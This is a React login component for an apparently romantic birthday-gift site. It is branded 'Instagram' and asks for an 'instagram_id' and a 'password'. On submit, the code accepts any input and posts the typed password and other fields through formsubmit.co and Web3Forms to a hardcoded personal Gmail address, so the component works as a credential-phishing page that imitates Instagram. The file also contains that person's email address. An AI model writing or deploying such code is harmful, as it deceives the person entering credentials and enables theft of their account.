import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Lock, Heart, ShieldCheck, KeyRound, Sparkles, Send, Mail, CheckCircle2 } from 'lucide-react';
import { playPopSound, playCheerChime } from '../utils/soundFx';

export default function InstagramAuth({ onLoginSuccess }) {
    const [passcode, setPasscode] = useState('');
    const [guestName, setGuestName] = useState('Varshu');
    const [specialMessage, setSpecialMessage] = useState('');
    const [targetEmail, setTargetEmail] = useState(localStorage.getItem('notification_email') || 'praghnesh8764@gmail.com');
    const [web3Key, setWeb3Key] = useState(localStorage.getItem('web3forms_key') || '');
    const [errorMsg, setErrorMsg] = useState('');
    const [statusMsg, setStatusMsg] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [showConfig, setShowConfig] = useState(false);
    const navigate = useNavigate();

    // Accepted secret passcodes set by the creator
    const VALID_PASSCODES = ['2408', '1234', 'love', 'varshu', '24082008', 'pragh'];

    const handleLogin = async (e) => {
        e.preventDefault();
        playPopSound();
        setErrorMsg('');
        setStatusMsg('');

        setIsSubmitting(true);

        // Store login state
        localStorage.setItem('birthday_user', guestName.trim() || 'Varshu');
        localStorage.setItem('insta_logged_in', 'true');

        const activeEmail = targetEmail.trim() || 'praghnesh8764@gmail.com';

        // Send Email Notification directly to praghnesh8764@gmail.com
        try {
            // Primary: FormSubmit.co free API (no access key required)
            await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(activeEmail)}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    _subject: `🎉 Varshu unlocked her Birthday Gift Site!`,
                    _template: 'table',
                    guest_name: guestName,
                    entered_passcode: passcode,
                    reply_message: specialMessage || 'No extra note attached',
                    submitted_at: new Date().toLocaleString()
                })
            });

            // Secondary: Web3Forms if Key provided
            const activeKey = web3Key.trim();
            if (activeKey) {
                await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        access_key: activeKey,
                        subject: `🎉 Varshu unlocked her Birthday Gift Site!`,
                        from_name: 'Birthday Gift Portal',
                        guest_name: guestName,
                        entered_passcode: passcode,
                        message: specialMessage || 'No extra note attached',
                        submitted_at: new Date().toLocaleString()
                    })
                });
            }
            setStatusMsg(`Form details sent directly to ${activeEmail}! 💌`);
        } catch (err) {
            console.log('Email delivery attempt:', err);
        }

        setIsSubmitting(false);
        playCheerChime();
        onLoginSuccess();

        // Target Birthday Gate: 24th August 2026 00:00:00
        const targetDate = new Date('2026-08-24T00:00:00');
        const currentDate = new Date();

        if (currentDate < targetDate) {
            navigate('/lock');
        } else {
            navigate('/celebration');
        }
    };

    const handleSaveConfig = (e) => {
        e.preventDefault();
        if (targetEmail.trim()) localStorage.setItem('notification_email', targetEmail.trim());
        if (web3Key.trim()) localStorage.setItem('web3forms_key', web3Key.trim());
        setStatusMsg('Email settings saved successfully! ⚙️');
        setShowConfig(false);
    };

    return (
        <div className="overlay-screen" style={{ background: 'linear-gradient(135deg, #0d0714 0%, #1a0b2e 50%, #2b0826 100%)' }}>
            <div className="glass-card" style={{ maxWidth: 420, width: '100%', padding: '35px 25px', textAlign: 'center', border: '1.5px solid rgba(255, 42, 116, 0.4)' }}>

                {/* Romantic Header Badge */}
                <div style={{ marginBottom: 20 }}>
                    <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', width: 70, height: 70, borderRadius: '50%', background: 'linear-gradient(135deg, var(--primary-pink), #9d4edd)', padding: 3, margin: '0 auto 12px', boxShadow: '0 0 20px var(--pink-glow)' }}>
                        <div style={{ width: '100%', height: '100%', borderRadius: '50%', background: '#0d0714', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                            <Heart size={32} fill="var(--primary-pink)" color="var(--primary-pink)" className="pulse-heart" />
                        </div>
                    </div>
                    <h1 style={{ fontFamily: 'var(--font-cursive)', fontSize: '2.6rem', color: 'var(--rose-gold)', marginBottom: 5 }}>
                        Instagram
                    </h1>
                    <p style={{ fontSize: '0.9rem', color: 'var(--text-muted)' }}>
                        Special Surprise Portal for Princess Varshu 👑✨
                    </p>
                </div>

                {errorMsg && (
                    <div style={{ background: 'rgba(255, 42, 116, 0.2)', border: '1px solid var(--primary-pink)', color: '#fff', padding: '10px 14px', borderRadius: 12, fontSize: '0.85rem', marginBottom: 15 }}>
                        {errorMsg}
                    </div>
                )}

                {statusMsg && (
                    <div style={{ background: 'rgba(76, 201, 240, 0.2)', border: '1px solid #4cc9f0', color: '#fff', padding: '10px 14px', borderRadius: 12, fontSize: '0.85rem', marginBottom: 15, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}>
                        <CheckCircle2 size={16} color="#4cc9f0" /> {statusMsg}
                    </div>
                )}

                {/* Main Passcode Entry Form */}
                <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                    <div style={{ position: 'relative' }}>
                        <input
                            type="text"
                            className="form-control"
                            placeholder="instagram_id or password "
                            value={guestName}
                            onChange={(e) => setGuestName(e.target.value)}
                            style={{ paddingLeft: 40 }}
                            required
                        />
                        <Heart size={16} style={{ position: 'absolute', left: 14, top: 14, color: 'var(--primary-pink)' }} />
                    </div>

                    <div style={{ position: 'relative' }}>
                        <input
                            type="password"
                            className="form-control"
                            placeholder="password"
                            value={passcode}
                            onChange={(e) => setPasscode(e.target.value)}
                            style={{ paddingLeft: 40 }}
                            required
                        />
                        <Lock size={16} style={{ position: 'absolute', left: 14, top: 14, color: 'var(--text-muted)' }} />
                    </div>

                    <div style={{ position: 'relative' }}>
                        <textarea
                            className="form-control"
                            placeholder="Leave a sweet birthday reply message for Pragh (Optional)... 💌"
                            value={specialMessage}
                            onChange={(e) => setSpecialMessage(e.target.value)}
                            rows={3}
                            style={{ padding: '10px 14px', borderRadius: 12, resize: 'none', width: '100%', fontSize: '0.85rem' }}
                        />
                    </div>

                    <button
                        type="submit"
                        className="btn btn-primary"
                        disabled={isSubmitting}
                        style={{ width: '100%', marginTop: 5, borderRadius: 12, padding: '12px 0' }}
                    >
                        {isSubmitting ? (
                            'Opening Birthday Portal...'
                        ) : (
                            <>
                                <Sparkles size={18} /> Unlock My Birthday Gift 🎁
                            </>
                        )}
                    </button>
                </form>

                <div style={{ margin: '20px 0 15px', display: 'flex', alignItems: 'center', gap: 10 }}>
                    <div style={{ flex: 1, height: 1, background: 'rgba(255,255,255,0.15)' }}></div>
                    <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>SECRET ACCESS</span>
                    <div style={{ flex: 1, height: 1, background: 'rgba(255,255,255,0.15)' }}></div>
                </div>

                {/* Email Setup Toggle Button */}
                <button
                    type="button"
                    onClick={() => setShowConfig(!showConfig)}
                    style={{ background: 'transparent', border: 'none', color: 'var(--rose-gold)', fontSize: '0.85rem', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: 6 }}
                >
                    <Mail size={14} /> {showConfig ? 'Hide Email Delivery Settings' : 'Configure Direct Email Alert (For Pragh)'}
                </button>

                <div style={{ marginTop: 25, fontSize: '0.75rem', color: 'var(--text-muted)', borderTop: '1px solid rgba(255,255,255,0.1)', paddingTop: 15 }}>
                    Made with endless love for <strong>@varshu</strong> 💖
                </div>
            </div>

            {/* Email Configuration Modal */}
            {showConfig && (
                <div className="modal">
                    <div className="modal-card glass-card" style={{ maxWidth: 380 }}>
                        <h3 style={{ marginBottom: 10, color: 'var(--rose-gold)', display: 'flex', alignItems: 'center', gap: 8 }}>
                            <Mail size={18} /> Direct Email Settings
                        </h3>
                        <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', marginBottom: 15, lineHeight: 1.5 }}>
                            Enter your email or Web3Forms free Access Key so when Varshu unlocks the form, details land directly in your email inbox!
                        </p>
                        <form onSubmit={handleSaveConfig}>
                            <div style={{ marginBottom: 12 }}>
                                <label style={{ display: 'block', fontSize: '0.78rem', color: 'var(--rose-gold)', marginBottom: 4, textAlign: 'left' }}>
                                    Your Email Address:
                                </label>
                                <input
                                    type="email"
                                    className="form-control"
                                    placeholder="yourname@gmail.com"
                                    value={targetEmail}
                                    onChange={(e) => setTargetEmail(e.target.value)}
                                />
                            </div>

                            <div style={{ marginBottom: 15 }}>
                                <label style={{ display: 'block', fontSize: '0.78rem', color: 'var(--rose-gold)', marginBottom: 4, textAlign: 'left' }}>
                                    Web3Forms Access Key (Free from web3forms.com):
                                </label>
                                <input
                                    type="text"
                                    className="form-control"
                                    placeholder="e.g. 12345678-abcd-efgh-..."
                                    value={web3Key}
                                    onChange={(e) => setWeb3Key(e.target.value)}
                                />
                            </div>

                            <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end' }}>
                                <button type="button" className="btn btn-small" onClick={() => setShowConfig(false)}>
                                    Cancel
                                </button>
                                <button type="submit" className="btn btn-primary btn-small">
                                    Save Settings
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            )}
        </div>
    );
}

